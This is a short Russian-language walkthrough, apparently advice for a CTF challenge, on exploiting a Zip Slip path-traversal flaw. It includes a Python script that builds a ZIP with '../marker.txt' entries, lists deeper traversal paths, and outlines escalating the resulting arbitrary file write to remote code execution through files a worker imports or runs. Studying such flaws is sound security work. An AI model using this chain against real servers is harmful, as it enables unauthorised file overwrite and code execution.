## Zip Slip

Уязвимость возникает, когда сервер распаковывает ZIP и **не проверяет `../` в именах файлов**.

Нормально:

```text
shells/ABC/file.txt
```

А вредоносный ZIP содержит:

```text
../../file.txt
```

и extractor может записать файл за пределами каталога extraction.


## 1. Создать ZIP с traversal

```bash
python3 - <<'PY'
import zipfile

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("shell.json", '{"name":"test","assets":[]}')
    z.writestr("../marker.txt", "ZIPSLIP_TEST")
PY
```

Проверить:

```bash
unzip -l evil.zip
```

Должно быть:

```text
shell.json
../marker.txt
```


## 2. Более глубокий traversal

```text
../marker.txt
../../marker.txt
../../../marker.txt
```

или:

```text
foo/../../marker.txt
```

---

## 3. Проверить, куда записался файл

Если extraction происходит:

```text
/app/shells/ABC/
```

то:

```text
../marker.txt
```

попытается попасть в:

```text
/app/shells/marker.txt
```

А:

```text
../../marker.txt
```

в:

```text
/app/marker.txt
```

**Главное:** URL не обязательно совпадает с filesystem path.


## 4. Не используй локальный `unzip` как доказательство

GNU `unzip` может защитить тебя:

```text
warning: skipped "../" path component(s)
```

Это означает только, что **твой локальный extractor безопасен**.

CTF-сервер может использовать другой extractor.


## 5. Что искать после Zip Slip

Сам Zip Slip **не является RCE**.

Нужно найти файл, который приложение/worker:

* импортирует;
* исполняет;
* загружает как plugin;
* использует как config;
* обрабатывает как template;
* запускает как job/task.

Для Python:

```text
.py → НЕ означает автоматическое выполнение
```

Например:

```text
/static/shell.py
```

обычно просто отдаст файл.

А вот:

```text
worker → import module → module.py
```

может дать execution.


### Главное правило

```text
Zip Slip
    ↓
Arbitrary File Write
    ↓
найти доверенный файл/каталог,
который сервер сам загрузит или выполнит
    ↓
RCE
```


То есть **Zip Slip у тебя есть**. Следующая задача — определить, **что именно сервер/worker автоматически загружает после распаковки**.
